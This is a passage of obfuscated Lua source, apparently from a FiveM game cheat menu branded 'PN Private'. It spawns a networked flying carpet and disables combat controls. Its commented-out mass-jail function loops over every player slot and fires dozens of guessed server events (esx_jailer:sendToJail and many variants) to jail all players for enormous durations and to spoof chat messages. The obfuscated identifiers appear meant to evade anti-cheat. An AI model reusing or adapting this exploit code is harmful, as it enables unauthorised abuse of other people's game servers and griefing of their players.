        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 99, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 100, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 142, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 143, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 263, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 264, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 257, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["C"], off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["F"], off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["LEFTCTRL"], off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["MOUSE1"], off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 25, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["R"], off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 45, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 80, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 140, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 250, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 263, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 310, off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["TAB"], off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["SPACE"], off_SDGHDSUIGSD)
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, PN_KEYSHTRHRTHTRH["X"], off_SDGHDSUIGSD)
    end
			
	local function DisableCombat_SDGHISUDGSD(off_SDGHDSUIGSD)
       sritizen_INVOKE_PN(0x5E6CC07646BBEAB8, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), off_SDGHDSUIGSD) -- Disable weapon firing
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 24, off_SDGHDSUIGSD) -- disable attack
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 25, off_SDGHDSUIGSD) -- disable aim
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 1, 37, off_SDGHDSUIGSD) -- disable weapon select
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 47, off_SDGHDSUIGSD) -- disable weapon
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 58, off_SDGHDSUIGSD) -- disable weapon
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 140, off_SDGHDSUIGSD) -- disable melee
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 141, off_SDGHDSUIGSD) -- disable melee
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 142, off_SDGHDSUIGSD) -- disable melee
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 143, off_SDGHDSUIGSD) -- disable melee
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 263, off_SDGHDSUIGSD) -- disable melee
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 264, off_SDGHDSUIGSD) -- disable melee
        sritizen_INVOKE_PN(0xFE99B66D079CF6BC, 0, 257, off_SDGHDSUIGSD) -- disable melee
    end
	
    local function rot_to_dir_DSGIHSDGSDG(rot_SDHGYUDSGSD)
        local radZ_DSGHSIUDGHDSG = rot_SDHGYUDSGSD.z * 0.0174532924
        local radX_DSGHSIUDGHDSG = rot_SDHGYUDSGSD.x * 0.0174532924
        local num_DSIGUSIDG = math.abs(math.cos(radX_DSGHSIUDGHDSG))
        local dir_DSIGHIUSDG_SDGIHSDUGSD = vector3(-math.sin(radZ_DSGHSIUDGHDSG) * num_DSIGUSIDG, math.cos(radZ_DSGHSIUDGHDSG) * num_DSIGUSIDG, radX_DSGHSIUDGHDSG)

        return dir_DSIGHIUSDG_SDGIHSDUGSD
    end
	
    local function _multiply_SDGIHSIUGDSG(vector_DSGISDUIGDSG, mult_DSGHSDUIGSDG)
        return vector3(vector_DSGISDUIGDSG.x * mult_DSGHSDUIGSDG, vector_DSGISDUIGDSG.y * mult_DSGHSDUIGSDG, vector_DSGISDUIGDSG.z * mult_DSGHSDUIGSDG)
    end
			
	local function _do_riding_SDGUDSHIGHSDYG()
        if not magic_riding_SDGHSIDUGSDG then
            sritizen_INVOKE_PN(0xE1EF3C1216AFF2CD, sritizen_INVOKE_PN(0xD80958FC74E988A6))
            local rot_SDHGYUDSGSD = GetEntityRotation_PN_DSGUHSDUYGUSD(magic_carpet_obj)
            sritizen_INVOKE_PN(0x8524A8B0171D5E07, magic_carpet_obj, 0.0, rot_SDHGYUDSGSD.y, rot_SDHGYUDSGSD.z)
        else
            local coords_DSIGSDGSD = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6), 0.0, 0.0, 0.0)
            local carpet_DSGUSDHIGDS = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(magic_carpet_obj, 0.0, 0.0, 0.0)
            local head_DSGHDSIUGDS = GetEntityHeading_PN_UDYUGDHIGKDFG(magic_carpet_obj)
            sritizen_INVOKE_PN(0x8E2530AA8ADA980E, sritizen_INVOKE_PN(0xD80958FC74E988A6), head_DSGHDSIUGDS)
            sritizen_INVOKE_PN(0x06843DA7060A026B, sritizen_INVOKE_PN(0xD80958FC74E988A6), carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z)
            sritizen_INVOKE_PN(0xEA47FE3719165B94, sritizen_INVOKE_PN(0xD80958FC74E988A6), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
        end
    end

    local function _right_vec_SDGHSIUDGSDHUG()
        local right_DSIGHIDSUGSD = vector3(0, 1, 0)

        return right_DSIGHIDSUGSD
    end

    local function _up_vec_DSIGHSDIUGSD()
        local up_DSGUSD = vector3(0, 0, 1)

        return up_DSGUSD
    end

    local function _do_flying_SDGUSHDIGSDG()
        if not magic_riding_SDGHSIDUGSDG then return end
        DisableMovement_DSIGHDSIUGSD(true)

        if not sritizen_INVOKE_PN(0x1F0B79228E461EC9, sritizen_INVOKE_PN(0xD80958FC74E988A6), "rcmcollect_paperleadinout@", "meditiate_idle", 3) then
            sritizen_INVOKE_PN(0xEA47FE3719165B94, sritizen_INVOKE_PN(0xD80958FC74E988A6), "rcmcollect_paperleadinout@", "meditiate_idle", 2.0, 2.5, -1, 47, 0, 0, 0, 0)
        end

        local carpet_DSGUSDHIGDS = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(magic_carpet_obj, 0.0, 0.0, 0.0)
        local rot_SDHGYUDSGSD = GetGameplayCamRot_PN_DSUGHSDUIGSD(0)

            sritizen_INVOKE_PN(0x8524A8B0171D5E07, magic_carpet_obj, rot_SDHGYUDSGSD.x + 0.0, rot_SDHGYUDSGSD.y + 0.0, rot_SDHGYUDSGSD.z + 0.0)
            local forwardVec = 
			GetEntityForwardVector_PN_SDGHSDIUGSD(magic_carpet_obj)
            local rightVec_DSIGHSDIUGSD = _right_vec_SDGHSIUDGSDHUG(magic_carpet_obj)
            local upVec_SDGUSDHIGSD = _up_vec_DSIGHSDIUGSD(magic_carpet_obj)
            local speed_DSGYSDIUGDS = 1.0

            if IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["LEFTCTRL"]) then
                speed_DSGYSDIUGDS = 0.1
            elseif IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["LEFTSHIFT"]) then
                speed_DSGYSDIUGDS = 2.8
            end

            if IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["W"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS + forwardVec * speed_DSGYSDIUGDS
            end

            if IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["S"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS - forwardVec * speed_DSGYSDIUGDS
            end

            if IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["SPACE"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS + upVec_SDGUSDHIGSD * speed_DSGYSDIUGDS
            end

            if IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["X"]) then
                carpet_DSGUSDHIGDS = carpet_DSGUSDHIGDS - upVec_SDGUSDHIGSD * speed_DSGYSDIUGDS
            end

            sritizen_INVOKE_PN(0x06843DA7060A026B, magic_carpet_obj, carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z)

        sritizen_INVOKE_PN(0x8524A8B0171D5E07, sritizen_INVOKE_PN(0xD80958FC74E988A6), rot_SDHGYUDSGSD.x, rot_SDHGYUDSGSD.y, rot_SDHGYUDSGSD.z)
        sritizen_INVOKE_PN(0x6B9BBD38AB0796DF, sritizen_INVOKE_PN(0xD80958FC74E988A6), magic_carpet_obj, 0, 0.0, 0.0, 1.0, rot_SDHGYUDSGSD.x, GetEntityHeading_PN_UDYUGDHIGKDFG(magic_carpet_obj), rot_SDHGYUDSGSD.z, false, false, false, false, 1, false)
    end

    local _no_combat_SDGUSDHIGSD
    local _was_no_combat_DSGISDIGSDG

    CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
        while Wlaczone_PN_MENU_E1QDA_XD do
            PN_WAIT_31DA31_PN(0)

            if _no_combat_SDGUSDHIGSD and not _was_no_combat_DSGISDIGSDG then
                _was_no_combat_DSGISDIGSDG = true
            elseif not _no_combat_SDGUSDHIGSD and _was_no_combat_DSGISDIGSDG then
                _was_no_combat_DSGISDIGSDG = false
                DisableCombat_SDGHISUDGSD(_no_combat_SDGUSDHIGSD)
            end

            if _no_combat_SDGUSDHIGSD then
                DisableCombat_SDGHISUDGSD(_no_combat_SDGUSDHIGSD)
            end
        end
    end)

    CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(function()
        RequestModelSync_SDUFHSIDGSDG("apa_mp_h_acc_rugwoolm_03")
        sritizen_INVOKE_PN(0xD3BD40951412FEF6, "rcmcollect_paperleadinout@")

        while Wlaczone_PN_MENU_E1QDA_XD do
            PN_WAIT_31DA31_PN(0)

            if medzikkarpet3109ad_PN then
                local our_cam = GetRenderingCam()

                if not magic_carpet_obj or not sritizen_INVOKE_PN(0x7239B21A38F536BA, magic_carpet_obj) then
                    local cur_SDGSIDGSDGSD = GetGameplayCamCoord()
                    local _dir_SDGISDGDSG = GetGameplayCamRot_PN_DSUGHSDUIGSD(0)
                    local dir_DSIGHIUSDG_SDGIHSDUGSD = rot_to_dir_DSGIHSDGSDG(_dir_SDGISDGDSG)
                    local dist_DSGUSDIGDS = 100.0
                    local len_SDUGHSIDGSD = _multiply_SDGIHSIUGDSG(dir_DSIGHIUSDG_SDGIHSDUGSD, dist_DSGUSDIGDS)
                    local targ_SDGHSDIUGSD = cur_SDGSIDGSDGSD + len_SDUGHSIDGSD
                    local handle_SDIGJSIUDGSD = sritizen_INVOKE_PN(0x377906D8A31E5586, cur_SDGSIDGSDGSD.x, cur_SDGSIDGSDGSD.y, cur_SDGSIDGSDGSD.z, targ_SDGHSDIUGSD.x, targ_SDGHSDIUGSD.y, targ_SDGHSDIUGSD.z, 1, preview_magic_carpet)
                    local _, hit_SDGJSUDIGSD, hit_pos_DSGIUSDGSD, _, entity_DSIGHSIDUG = GetShapeTestResult_PN_DSUGHIDSUGS(handle_SDIGJSIUDGSD)

                    if not preview_magic_carpet or not sritizen_INVOKE_PN(0x7239B21A38F536BA, preview_magic_carpet) then
                        _no_combat_SDGUSDHIGSD = true
                        preview_magic_carpet = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "apa_mp_h_acc_rugwoolm_03"), hit_pos_DSGIUSDGSD.x, hit_pos_DSGIUSDGSD.y, hit_pos_DSGIUSDGSD.z + 0.5, false, true, true)
                        sritizen_INVOKE_PN(0x1A9205C1B9EE827F, preview_magic_carpet, false, false)
						sritizen_INVOKE_PN(0x44A0870B7E92D7C0, preview_magic_carpet, 100)
                        PN_WAIT_31DA31_PN(50)
                    elseif hit_SDGJSUDIGSD then
                        sritizen_INVOKE_PN(0x06843DA7060A026B, preview_magic_carpet, hit_pos_DSGIUSDGSD.x, hit_pos_DSGIUSDGSD.y, hit_pos_DSGIUSDGSD.z + 0.5)
                        sritizen_INVOKE_PN(0x44A0870B7E92D7C0, preview_magic_carpet, 100)
                        sritizen_INVOKE_PN(0x428CA6DBD1094446, preview_magic_carpet, true)
						sritizen_INVOKE_PN(0x8524A8B0171D5E07, preview_magic_carpet, 0.0, 0.0, _dir_SDGISDGDSG.z + 0.0)
                        sritizen_INVOKE_PN(0x1A9205C1B9EE827F, preview_magic_carpet, false, false)
                    end

                    if IsDisabledControlPressed_PN_DSUHGSUDGD(0, PN_KEYSHTRHRTHTRH["MOUSE1"]) and not Showing then
                        magic_carpet_obj = sritizen_INVOKE_PN(0x509D5878EB39E842, sritizen_INVOKE_PN(0xD24D37CC275948CC, "apa_mp_h_acc_rugwoolm_03"), hit_pos_DSGIUSDGSD.x, hit_pos_DSGIUSDGSD.y, hit_pos_DSGIUSDGSD.z + 0.5, true, true, true)
                        DoNetwork_DSIGHISUDGSDG(magic_carpet_obj)
                        local rot_SDHGYUDSGSD = GetEntityRotation_PN_DSGUHSDUYGUSD(preview_magic_carpet)
                        sritizen_INVOKE_PN(0x8524A8B0171D5E07, magic_carpet_obj, rot_SDHGYUDSGSD)
                        sritizen_INVOKE_PN(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(preview_magic_carpet))
                        _no_combat_SDGUSDHIGSD = false
                    end
                else
                    sritizen_INVOKE_PN(0x428CA6DBD1094446, magic_carpet_obj, true)
                    _do_flying_SDGUSHDIGSDG()
                    local coords_DSIGSDGSD = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(sritizen_INVOKE_PN(0xD80958FC74E988A6), 0.0, 0.0, 0.0)
                    local carpet_DSGUSDHIGDS = GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(magic_carpet_obj, vector_origin)
                    local dist_DSGUSDIGDS = GetDistanceBetweenCoords_PN_UDHGIUSDHGIUDF(coords_DSIGSDGSD.x, coords_DSIGSDGSD.y, coords_DSIGSDGSD.z, carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z)

                    if dist_DSGUSDIGDS <= 5.0 then
                        DrawText3D_PN_UDGUYSDHUGSFFDG(carpet_DSGUSDHIGDS.x, carpet_DSGUSDHIGDS.y, carpet_DSGUSDHIGDS.z, "Press [E] to get ".. (magic_riding_SDGHSIDUGSDG and "off"or "on") .. ".", Tertiary_SDGUSDHGISDG[1], Tertiary_SDGUSDHGISDG[2], Tertiary_SDGUSDHGISDG[3])

                        if sritizen_INVOKE_PN(0x91AEF906BCA88877, 0, PN_KEYSHTRHRTHTRH["E"]) then
                            magic_riding_SDGHSIDUGSDG = not magic_riding_SDGHSIDUGSDG
                            _do_riding_SDGUDSHIGHSDYG()
                        end
                    end
                end
            else
                _no_combat_SDGUSDHIGSD = false

                if preview_magic_carpet and sritizen_INVOKE_PN(0x7239B21A38F536BA, preview_magic_carpet) then
                    sritizen_INVOKE_PN(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(preview_magic_carpet))
                end

                if magic_carpet_obj and sritizen_INVOKE_PN(0x7239B21A38F536BA, magic_carpet_obj) then
                   sritizen_INVOKE_PN(0xAE3CBE5BF394C9C9, Citizen.PointerValueIntInitialized(magic_carpet_obj))
                    sritizen_INVOKE_PN(0xE1EF3C1216AFF2CD, sritizen_INVOKE_PN(0xD80958FC74E988A6))
                end
            end
        end
    end)
			
			
--[[local function jailAllplayer_jguerhgurekge()
	for sinksianksionk=0, 255 do
	PN_WAIT_31DA31_PN(2500)
			  TriggerServerEvent("esx-qalle-jail:jailPlayer", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 45 * 60)
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 45 * 60)
			TriggerServerEvent("js:jailuser", getplejerid_PN(sinksianksionk), 45 * 60, "PN Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 45 * 60)
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 45 * 60)
			TriggerServerEvent("js:jailuser", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail132", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:*", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:eloelo90", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:wwiezienie", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("searp:sendToJail", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("wyspa_jail:SendMessage", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT")
			TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJailhype", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJailf", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJailtrop", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432, 'SenseiToUjJebanyWDupeCfelPierdolony1337Kurwo')
			TriggerServerEvent("17A34C820A685513C5B4ADDD85968B9E905CC300A261EB55D299ABCB6C90AAA872712B3B6C13DC41913FCC2BE84A07EF9300DC4E89669A4B0E6FBB344A69D239", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJail132", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:fabianfudalijebanyprzyglup", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jebackoguszkaa_jailer:sendToJail", getplejerid_PN(sinksianksionk), 5023432432434200, "PN Private SKRRTTTT", -32432432423432432)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 3000)
			TriggerServerEvent("esx_jailer:sendToJailf", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx-jail:jailPlayer",   getplejerid_PN(sinksianksionk), 3000)
			TriggerServerEvent("esx_jailer:jailhype", getplejerid_PN(sinksianksionk), 3000)
			TriggerServerEvent("esx_jailer:sendToJial", getplejerid_PN(sinksianksionk), 59999, "PN Private SKRRTTTT?", 9333397)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 59999, "PN Private SKRRTTTT?", 9333397)
			TriggerServerEvent("esx-jail:jailPlayer", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 9999999999)
			TriggerServerEvent("esx_policejob:message", getplejerid_PN(sinksianksionk), "PN Private SKRRTTTT")
			TriggerServerEvent("hazerp:wyslijdopaki", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 50000)
			TriggerServerEvent("8321hiue89js", getplejerid_PN(sinksianksionk), 5007, "PN Private SKRRTTTT", 323434532532, securityToken)
			TriggerServerEvent("esx_jailer:sendToJailjebacdisafrajerze", getplejerid_PN(sinksianksionk), 300000, "PN Private SKRRTTTT", 500324532)
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:Wiezienie", getplejerid_PN(sinksianksionk), 999999999 * 60, "PN Private SKRRTTTT")
			TriggerServerEvent("js:jailuser", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(PlayerId()) .."PN Private SKRRTTTT")
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 3000)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 300)
			TriggerServerEvent("esx-qalle-jail:jailPlayer", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayerNew", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 50000)
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent("js:jailuser", getplejerid_PN(sinksianksionk), 5000, "PN Private SKRRTTTT")
			TriggerServerEvent('chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(PlayerId()) .."PN Private SKRRTTTT")
			TriggerServerEvent('esx_policejob:zakujtypeczka',  getplejerid_PN(sinksianksionk))
			TriggerServerEvent('esx_ruski_areszt:startAreszt', getplejerid_PN(sinksianksionk))
			TriggerServerEvent("arisonarp:wiezienie", getplejerid_PN(sinksianksionk), 9999999999 * 60, "PN Private SKRRTTTT", 1337)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 9999999 * 60)
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 9999999 * 60)
			TriggerServerEvent("js:jailuser", getplejerid_PN(sinksianksionk), 999999 * 60, "PN Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", getplejerid_PN(sinksianksionk), 999999 * 60, "PN Private SKRRTTTT")
			TriggerServerEvent("wysparp_tablet:SendMessage", getplejerid_PN(sinksianksionk), 9999 * 60, "PN Private SKRRTTTT", 9999999999)
			TriggerServerEvent("wiezieniejailer:sendToJail",3, getplejerid_PN(sinksianksionk), 9999 * 60, "PN Private SKRRTTTT", 1,2137)
			TriggerServerEvent("esxjailer:sendToJail2", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent('esx:wiezienie', getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailers:sendToJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("arisonarp:wiezienie",  getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("esx_jail:sendTooJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailer:sendToJailf", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailer:sendTooJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailer:sendToJailf", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("esxjailers:sendToJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 1)
			TriggerServerEvent("esx_jailer:sendToWiezz",  getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jaler:sendToWiezz", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 9937, "PN Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jailer:sendToJailf", getplejerid_PN(sinksianksionk), 9937 * 60, "PN Private SKRRTTTT", 9995345349999999)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT")
			TriggerServerEvent("wyspa_jail:SendMessage", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT")
			TriggerServerEvent("wyspa_jail:addKartoteka", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("wyspa_jail:addKartoteka", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("projektsantos:wiezienie", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJailf", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx-qalle-jail:Wiezienie", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT")
			TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:jail", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent('6d87e977-8ba1-4d98-8a88-d0ca16517da7', getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jailer:sendToJail", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("projektsantos:wiezienie", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("luki_jailer:sendToJail", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("arisonarp:wiezienie", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 99953)
			TriggerServerEvent("esx_jail:sendToJail", getplejerid_PN(sinksianksionk), 99999 * 60)
			TriggerServerEvent("js:jailuser", getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT")
			TriggerServerEvent("esx-qalle-jail:jailPlayer", getplejerid_PN(sinksianksionk), 999999 * 60, "PN Private SKRRTTTT")
			TriggerServerEvent("wiezieniejailer:sendToJail",3, getplejerid_PN(sinksianksionk), 99999 * 60, "PN Private SKRRTTTT", 1,2137)
			TriggerServerEvent("esxjailer:sendToJail2", getplejerid_PN(sinksianksionk), 99999, "PN Private SKRRTTTT", 1)
